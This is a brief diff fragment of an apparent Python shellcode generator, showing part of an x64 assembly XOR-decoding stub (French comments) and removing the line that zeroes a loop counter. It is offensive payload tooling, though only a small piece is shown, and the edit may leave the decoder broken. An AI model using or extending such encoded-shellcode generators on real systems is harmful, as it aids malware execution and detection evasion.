@@ -61,7 +61,6 @@ def generate_shellcode(command: str, arch: str = 'x64', xor_key: int = 0xB6) -> 
         
         asm += f"""
                 mov rdi, rsp        ; rdi = ptr vers la chaîne encodée
-                xor rax, rax        ; compteur = 0
                 jmp xorshellcode
                 
             shellcodeExecution:
